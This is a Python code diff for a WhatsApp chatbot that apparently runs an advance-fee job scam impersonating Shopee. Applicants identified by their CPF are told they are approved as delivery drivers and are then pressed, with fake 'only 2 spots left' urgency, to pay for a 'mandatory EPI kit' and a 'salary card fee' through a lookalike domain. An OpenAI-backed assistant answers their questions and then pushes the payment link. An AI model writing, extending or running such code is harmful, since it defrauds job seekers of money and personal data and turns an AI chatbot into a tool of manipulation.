@@ -71,6 +71,8 @@ class ConversationAutomation:
                 return self._handle_cpf_input(conv_state, conversation_id, message_content, phone_number_id)
             elif current_state == 'confirming_name':
                 return self._handle_name_confirmation(conv_state, conversation_id, message_content, phone_number_id)
+            elif current_state == 'pending_questions':
+                return self._handle_pending_questions(conv_state, conversation_id, message_content, phone_number_id)
             
             return False
             
@@ -146,16 +148,29 @@ class ConversationAutomation:
             client_data = self._fetch_client_data(cpf)
             
             if client_data and client_data.get('sucesso'):
-                # Cliente encontrado - confirmar nome
+                # Cliente encontrado - verificar status
                 cliente = client_data.get('cliente', {})
                 nome = cliente.get('nome', 'Nome não informado')
+                status = cliente.get('status', 'UNKNOWN')
                 
                 # Salvar dados do cliente no estado persistente
                 import json
+                conv_state.cpf_status = status
+                conv_state.original_cpf = cpf
                 conv_state.update_state('confirming_name', json.dumps(client_data))
                 
-                # Criar mensagem de confirmação com botões
-                return self._send_name_confirmation(conv_state, conversation_id, nome, phone_number_id)
+                logging.info(f"🔍 CPF {cpf_masked} - Status: {status}")
+                
+                # Fluxo condicional baseado no status
+                if status == 'APPROVED':
+                    # Fluxo original - confirmar nome
+                    return self._send_name_confirmation(conv_state, conversation_id, nome, phone_number_id)
+                elif status == 'PENDING':
+                    # Novo fluxo PENDING - pular confirmação e ir direto para fluxo especial
+                    return self._handle_pending_flow(conv_state, conversation_id, nome, phone_number_id)
+                else:
+                    # Status desconhecido - usar fluxo padrão
+                    return self._send_name_confirmation(conv_state, conversation_id, nome, phone_number_id)
             else:
                 # Cliente não encontrado
                 not_found_message = (
@@ -561,3 +576,204 @@ class ConversationAutomation:
                 
         except Exception as e:
             logging.error(f"Erro no processamento de mensagens agendadas: {str(e)}")
+    
+    def _handle_pending_flow(self, conv_state, conversation_id: int, nome: str, phone_number_id: str) -> bool:
+        """Novo fluxo para usuários com status PENDING - Kit EPI não pago"""
+        try:
+            # Primeira mensagem personalizada com nome da API
+            first_message = (
+                f"Olá {nome}! ✅\n\n"
+                f"Seu cadastro como entregador foi aprovado com sucesso! 🎉\n\n"
+                f"Porém, vi no sistema que você ainda não adquiriu o *Kit obrigatório de EPI* "
+                f"e nem pagou a *taxa de entrega do Cartão salário*. 📦💳"
+            )
+            
+            # Enviar primeira mensagem
+            success1, result1 = self.whatsapp_api.send_text_message(conv_state.phone_number, first_message)
+            if success1:
+                self._save_outbound_message(conversation_id, first_message, result1.get('messageId'))
+                
+                # Segunda mensagem com urgência e botões
+                second_message = (
+                    f"⚠️ *URGENTE {nome}!*\n\n"
+                    f"🔥 As vagas para entregador Shopee na sua região estão acabando!\n\n"
+                    f"📊 Restam apenas *2 vagas disponíveis*!\n\n"
+                    f"🤔 Você ficou com alguma dúvida sobre o processo?"
+                )
+                
+                # Botões Sim/Não
+                buttons = [
+                    {
+                        'type': 'reply',
+                        'reply': {
+                            'id': 'pending_doubt_yes',
+                            'title': '✅ SIM - Tenho dúvidas'
+                        }
+                    },
+                    {
+                        'type': 'reply', 
+                        'reply': {
+                            'id': 'pending_doubt_no',
+                            'title': '❌ NÃO - Sem dúvidas'
+                        }
+                    }
+                ]
+                
+                # Enviar mensagem com botões
+                success2, result2 = self._send_interactive_buttons(conv_state.phone_number, second_message, buttons)
+                
+                if success2:
+                    self._save_outbound_message(conversation_id, second_message + " [Com botões: SIM/NÃO]", result2.get('messageId'))
+                    
+                    # Atualizar estado para aguardar resposta dos botões
+                    conv_state.update_state('pending_questions')
+                    logging.info(f"✅ Fluxo PENDING iniciado para {conv_state.phone_number}: {nome[:20]}...")
+                    return True
+                else:
+                    # Fallback para texto simples
+                    fallback_message = (
+                        second_message + "\n\n"
+                        "👆 Responda:\n"
+                        "1️⃣ Digite *SIM* se tem dúvidas\n"
+                        "2️⃣ Digite *NAO* se não tem dúvidas"
+                    )
+                    
+                    success3, result3 = self.whatsapp_api.send_text_message(conv_state.phone_number, fallback_message)
+                    if success3:
+                        self._save_outbound_message(conversation_id, fallback_message, result3.get('messageId'))
+                        conv_state.update_state('pending_questions')
+                        return True
+            
+            return False
+            
+        except Exception as e:
+            logging.error(f"Erro no fluxo PENDING: {str(e)}")
+            return False
+    
+    def _handle_pending_questions(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
+        """Processar respostas do fluxo PENDING (botões SIM/NÃO ou perguntas OpenAI)"""
+        try:
+            content_lower = message_content.lower().strip()
+            
+            # Se é resposta aos botões SIM/NÃO iniciais
+            if content_lower in ['sim', 'yes', 's', '1', 'pending_doubt_yes', '✅ sim - tenho dúvidas', 'tenho dúvidas']:
+                # Usuário tem dúvidas - ativar OpenAI
+                question_message = (
+                    "Perfeito! 💭\n\n"
+                    "Pode me escrever ou enviar um áudio com sua dúvida.\n\n"
+                    "Estou aqui para esclarecer tudo sobre ser entregador da Shopee! 😊"
+                )
+                
+                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, question_message)
+                if success:
+                    self._save_outbound_message(conversation_id, question_message, result.get('messageId'))
+                    # Manter no mesmo estado para receber a pergunta
+                    return True
+                
+            elif content_lower in ['nao', 'não', 'no', 'n', '2', 'pending_doubt_no', '❌ nao - sem dúvidas', 'sem dúvidas']:
+                # Usuário não tem dúvidas - ir direto para pagamento
+                return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
+                
+            else:
+                # É uma pergunta do usuário - processar com OpenAI
+                return self._process_openai_question(conv_state, conversation_id, message_content, phone_number_id)
+            
+            return False
+            
+        except Exception as e:
+            logging.error(f"Erro ao processar perguntas PENDING: {str(e)}")
+            return False
+    
+    def _process_openai_question(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
+        """Processar pergunta do usuário usando OpenAI"""
+        try:
+            from openai_service import ShopeeDeliveryAssistant
+            
+            # Incrementar contador de perguntas
+            conv_state.question_count = (conv_state.question_count or 0) + 1
+            
+            logging.info(f"🤖 Processando pergunta #{conv_state.question_count} via OpenAI para {conv_state.phone_number}")
+            
+            # Buscar histórico de conversa se necessário (simplificado por agora)
+            conversation_history = []
+            
+            # Obter resposta da IA
+            ai_response = ShopeeDeliveryAssistant.get_response(message_content, conversation_history)
+            
+            # Enviar resposta da IA
+            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, ai_response)
+            if success:
+                self._save_outbound_message(conversation_id, f"🤖 IA: {ai_response}", result.get('messageId'))
+                
+                # Verificar se deve finalizar e enviar link de pagamento
+                if conv_state.question_count >= 5 or ShopeeDeliveryAssistant.should_finalize_payment(conversation_history, conv_state.question_count):
+                    # Dar uma pausa antes de enviar o link
+                    import time
+                    time.sleep(2)
+                    
+                    return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
+                
+                # Continuar no mesmo estado para mais perguntas
+                return True
+            
+            return False
+            
+        except Exception as e:
+            logging.error(f"Erro na OpenAI: {str(e)}")
+            # Resposta de fallback
+            fallback_response = (
+                "Entendo sua dúvida! 😊\n\n"
+                "O importante é finalizar seu cadastro hoje mesmo. "
+                "As vagas estão se esgotando rapidamente! ⏰"
+            )
+            
+            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, fallback_response)
+            if success:
+                self._save_outbound_message(conversation_id, fallback_response, result.get('messageId'))
+                return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
+            
+            return False
+    
+    def _send_pending_payment_link(self, conv_state, conversation_id: int, phone_number_id: str) -> bool:
+        """Enviar link de pagamento personalizado para fluxo PENDING"""
+        try:
+            # Extrair primeiro nome
+            import json
+            client_data = json.loads(conv_state.client_data) if conv_state.client_data else {}
+            cliente_info = client_data.get('cliente', {})
+            full_name = cliente_info.get('nome', 'Usuário')
+            first_name = full_name.split()[0] if full_name and full_name != 'Usuário' else 'Usuário'
+            
+            # Criar link personalizado usando CPF original sem pontuação
+            cpf_clean = conv_state.original_cpf  # CPF já está sem pontuação
+            payment_link = f"https://shopee.acesso.inc/{cpf_clean}"
+            
+            # Mensagem final com link de pagamento
+            final_message = (
+                f"Perfeito {first_name}! 🚀\n\n"
+                f"Para finalizar seu cadastro e garantir sua vaga, basta clicar no botão abaixo "
+                f"e realizar o pagamento do Kit EPI e taxa do Cartão Salário.\n\n"
+                f"⚠️ *URGENTE:* Restam apenas 2 vagas na sua região!"
+            )
+            
+            # Enviar mensagem com botão de pagamento
+            success, result = self.whatsapp_api.send_interactive_cta_url_message(
+                conv_state.phone_number,
+                final_message,
+                "Finalizar Cadastro Agora",
+                payment_link
+            )
+            
+            if success:
+                self._save_outbound_message(conversation_id, final_message + f"\n[Botão: Finalizar Cadastro - {payment_link}]", result.get('messageId'))
+                
+                # Limpar estado da automação
+                conv_state.clear_state()
+                logging.info(f"✅ Fluxo PENDING concluído para {conv_state.phone_number} - Link: {payment_link}")
+                return True
+            
+            return False
+            
+        except Exception as e:
+            logging.error(f"Erro ao enviar link de pagamento PENDING: {str(e)}")
+            return False
